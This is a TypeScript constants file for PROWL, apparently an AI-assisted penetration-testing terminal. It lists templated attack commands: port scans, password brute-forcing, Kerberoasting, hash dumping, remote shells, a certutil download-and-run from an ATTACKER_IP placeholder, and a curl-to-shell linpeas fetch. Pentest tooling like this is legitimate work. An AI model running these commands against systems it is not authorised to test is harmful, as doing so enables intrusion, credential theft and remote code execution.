export const APP_NAME = 'PROWL';
export const APP_VERSION = '0.1.0';
export const DEFAULT_ENGAGEMENT_ID = 'default-engagement';
export const DEFAULT_ENGAGEMENT_NAME = 'Default Engagement';

export const HIGH_RISK_PORTS = [21, 22, 23, 80, 139, 443, 445, 3306, 3389, 5432, 6379, 27017];
export const CRITICAL_PORTS = [3306, 23, 21, 445, 139];

export const QUICK_COMMANDS = [
  { label: 'nmap', cmd: 'nmap -sV -sC -p- ', description: 'Port scan with service detection' },
  { label: 'gobuster', cmd: 'gobuster dir -u http:// -w /usr/share/wordlists/dirb/common.txt ', description: 'Directory brute-force' },
  { label: 'sqlmap', cmd: 'sqlmap -u "" --batch --dbs ', description: 'SQL injection scanner' },
  { label: 'hydra', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh:// ', description: 'Brute-force login' },
  { label: 'masscan', cmd: 'masscan -p1-65535 --rate=1000 ', description: 'Fast port scanner' },
  { label: 'nikto', cmd: 'nikto -h http:// ', description: 'Web server scanner' },
  { label: 'metasploit', cmd: 'msfconsole -q ', description: 'Exploit framework' },
];

// Tool commands with {IP} and {HOST} placeholders for smart substitution
// {IP} = target IP, {HOST} = hostname if set, otherwise IP
// {URL} = http://{HOST}
export interface ToolCommand {
  id: string;
  label: string;
  category: 'recon' | 'web' | 'brute' | 'exploit' | 'post' | 'windows' | 'util';
  cmd: string;
  description: string;
}

export const TOOL_COMMANDS: ToolCommand[] = [
  // Recon
  { id: 'nmap-quick', label: 'nmap quick', category: 'recon', cmd: 'nmap -sV -sC {IP}', description: 'Quick port scan + service detection' },
  { id: 'nmap-full', label: 'nmap full', category: 'recon', cmd: 'nmap -Pn -p- --min-rate 1000 {IP} -oN /workspace/{IP}/full-tcp.txt', description: 'Full TCP port scan' },
  { id: 'nmap-udp', label: 'nmap UDP', category: 'recon', cmd: 'nmap -sU --top-ports 50 {IP}', description: 'Top 50 UDP ports' },
  { id: 'nmap-vuln', label: 'nmap vuln', category: 'recon', cmd: 'nmap --script vuln -p- {IP}', description: 'Vulnerability scan' },
  { id: 'masscan', label: 'masscan', category: 'recon', cmd: 'masscan -p1-65535 --rate=1000 {IP}', description: 'Fast port discovery' },
  { id: 'whatweb', label: 'whatweb', category: 'recon', cmd: 'whatweb {URL}', description: 'Web technology fingerprint' },
  { id: 'dnsrecon', label: 'dnsrecon', category: 'recon', cmd: 'dnsrecon -d {HOST}', description: 'DNS enumeration' },
  { id: 'enum4linux', label: 'enum4linux', category: 'recon', cmd: 'enum4linux -a {IP}', description: 'SMB/Windows enumeration' },
  { id: 'wafw00f', label: 'wafw00f', category: 'recon', cmd: 'wafw00f {URL}', description: 'WAF detection' },
  // Web
  { id: 'gobuster-dir', label: 'gobuster dir', category: 'web', cmd: 'gobuster dir -u {URL} -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt', description: 'Directory brute-force' },
  { id: 'gobuster-vhost', label: 'gobuster vhost', category: 'web', cmd: 'gobuster vhost -u {URL} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain', description: 'Virtual host discovery' },
  { id: 'gobuster-dns', label: 'gobuster dns', category: 'web', cmd: 'gobuster dns -d {HOST} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', description: 'DNS subdomain brute-force' },
  { id: 'feroxbuster', label: 'feroxbuster', category: 'web', cmd: 'feroxbuster -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt', description: 'Recursive directory scan' },
  { id: 'nikto', label: 'nikto', category: 'web', cmd: 'nikto -h {URL}', description: 'Web vulnerability scanner' },
  { id: 'wfuzz', label: 'wfuzz', category: 'web', cmd: 'wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 {URL}/FUZZ', description: 'Web fuzzer' },
  { id: 'sqlmap', label: 'sqlmap', category: 'web', cmd: 'sqlmap -u "{URL}/" --batch --dbs', description: 'SQL injection scanner' },
  { id: 'curl', label: 'curl', category: 'web', cmd: 'curl -s -v {URL}/', description: 'HTTP request' },
  // Brute force
  { id: 'hydra-ssh', label: 'hydra SSH', category: 'brute', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{IP}', description: 'SSH brute-force' },
  { id: 'hydra-ftp', label: 'hydra FTP', category: 'brute', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{IP}', description: 'FTP brute-force' },
  { id: 'hydra-http', label: 'hydra HTTP', category: 'brute', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"', description: 'HTTP form brute-force' },
  { id: 'john', label: 'john', category: 'brute', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt ', description: 'Password cracker' },
  { id: 'hashcat', label: 'hashcat', category: 'brute', cmd: 'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt', description: 'GPU hash cracker' },
  // Exploit
  { id: 'msfconsole', label: 'msfconsole', category: 'exploit', cmd: 'msfconsole -q', description: 'Metasploit framework' },
  { id: 'searchsploit', label: 'searchsploit', category: 'exploit', cmd: 'searchsploit ', description: 'Exploit database search' },
  // Post-exploitation (Linux)
  { id: 'ssh-login', label: 'ssh', category: 'post', cmd: 'ssh admin@{IP}', description: 'SSH login' },
  { id: 'privesc-suid', label: 'find SUID', category: 'post', cmd: 'find / -perm -4000 -type f 2>/dev/null', description: 'Find SUID binaries' },
  { id: 'privesc-sudo', label: 'sudo -l', category: 'post', cmd: 'sudo -l', description: 'Check sudo permissions' },
  { id: 'privesc-cron', label: 'crontab', category: 'post', cmd: 'cat /etc/crontab && ls -la /etc/cron.*/', description: 'Check cron jobs' },
  { id: 'privesc-caps', label: 'getcap', category: 'post', cmd: 'getcap -r / 2>/dev/null', description: 'Find capabilities' },
  // Windows / Active Directory
  { id: 'evil-winrm', label: 'evil-winrm', category: 'windows', cmd: 'evil-winrm -i {IP} -u admin -p ', description: 'WinRM shell' },
  { id: 'impacket-psexec', label: 'psexec', category: 'windows', cmd: 'impacket-psexec admin@{IP}', description: 'PsExec remote shell' },
  { id: 'impacket-smbexec', label: 'smbexec', category: 'windows', cmd: 'impacket-smbexec admin@{IP}', description: 'SMBExec remote shell' },
  { id: 'impacket-wmiexec', label: 'wmiexec', category: 'windows', cmd: 'impacket-wmiexec admin@{IP}', description: 'WMI remote shell' },
  { id: 'impacket-smb', label: 'smbclient', category: 'windows', cmd: 'smbclient -L //{IP}/ -N', description: 'List SMB shares' },
  { id: 'impacket-secretsdump', label: 'secretsdump', category: 'windows', cmd: 'impacket-secretsdump admin@{IP}', description: 'Dump SAM/NTDS hashes' },
  { id: 'impacket-getuserspns', label: 'GetUserSPNs', category: 'windows', cmd: 'impacket-GetUserSPNs {HOST}/admin -dc-ip {IP} -request', description: 'Kerberoasting' },
  { id: 'impacket-getnpusers', label: 'GetNPUsers', category: 'windows', cmd: 'impacket-GetNPUsers {HOST}/ -dc-ip {IP} -no-pass -usersfile users.txt', description: 'AS-REP roasting' },
  { id: 'crackmapexec-smb', label: 'cme smb', category: 'windows', cmd: 'crackmapexec smb {IP} -u admin -p ', description: 'SMB auth check' },
  { id: 'crackmapexec-winrm', label: 'cme winrm', category: 'windows', cmd: 'crackmapexec winrm {IP} -u admin -p ', description: 'WinRM auth check' },
  { id: 'crackmapexec-shares', label: 'cme shares', category: 'windows', cmd: 'crackmapexec smb {IP} -u admin -p "" --shares', description: 'Enumerate SMB shares' },
  { id: 'crackmapexec-users', label: 'cme users', category: 'windows', cmd: 'crackmapexec smb {IP} -u admin -p "" --users', description: 'Enumerate domain users' },
  { id: 'rpcclient', label: 'rpcclient', category: 'windows', cmd: 'rpcclient -U "" -N {IP}', description: 'RPC null session' },
  { id: 'ldapsearch', label: 'ldapsearch', category: 'windows', cmd: 'ldapsearch -x -H ldap://{IP} -b "DC={HOST},DC=local"', description: 'LDAP enumeration' },
  { id: 'bloodhound', label: 'bloodhound-py', category: 'windows', cmd: 'bloodhound-python -d {HOST} -u admin -p "" -ns {IP} -c All', description: 'AD graph collection' },
  { id: 'kerbrute', label: 'kerbrute', category: 'windows', cmd: 'kerbrute userenum --dc {IP} -d {HOST} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt', description: 'Kerberos user enumeration' },
  { id: 'winpeas', label: 'winpeas', category: 'windows', cmd: 'certutil -urlcache -f http://ATTACKER_IP:8080/winPEASx64.exe winpeas.exe && winpeas.exe', description: 'Windows privesc check' },
  // Utility
  { id: 'linpeas', label: 'linpeas', category: 'util', cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', description: 'Linux privilege escalation' },
  { id: 'add-hosts', label: '/etc/hosts', category: 'util', cmd: 'echo "{IP} {HOST}" >> /etc/hosts', description: 'Add hostname to hosts file' },
  { id: 'python-server', label: 'python srv', category: 'util', cmd: 'python3 -m http.server 8080', description: 'Quick HTTP server' },
  { id: 'nc-listener', label: 'nc listen', category: 'util', cmd: 'nc -lvnp 4444', description: 'Netcat listener' },
  { id: 'chisel-server', label: 'chisel srv', category: 'util', cmd: 'chisel server --reverse --port 8000', description: 'Chisel reverse tunnel server' },
];

export const KEYWORD_COMMANDS = [
  'target',
  'note',
  'notes',
  'add last',
  'ask',
  'help',
  'hack help',
  'search',
  'export notes',
  'commands',
];

export const WELCOME_BANNER = `\r\n\x1b[38;5;99m────────────────────────────────────────────\x1b[0m\r\n\x1b[1;38;5;99m  PROWL v0.1.0\x1b[0m \x1b[38;5;240m· intelligent pentester terminal\x1b[0m\r\n  \x1b[38;5;240mask\x1b[0m \x1b[38;5;99m·\x1b[0m AI assist   \x1b[38;5;240mnote\x1b[0m \x1b[38;5;99m·\x1b[0m add note   \x1b[38;5;240mhelp\x1b[0m \x1b[38;5;99m·\x1b[0m commands\r\n\x1b[38;5;99m────────────────────────────────────────────\x1b[0m\r\n\r\n`;

export const CLAUDE_MODEL = 'claude-sonnet-4-6';
export const CLAUDE_MAX_TOKENS = 8192;
export const CLAUDE_API_URL = 'https://api.anthropic.com/v1/messages';

export const NMAP_PORT_REGEX = /(\d+)\/tcp\s+open\s+(\S+)/g;
export const IP_REGEX = /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g;
export const NMAP_SERVICE_REGEX = /(\d+)\/tcp\s+open\s+(\S+)\s+(.*)/g;
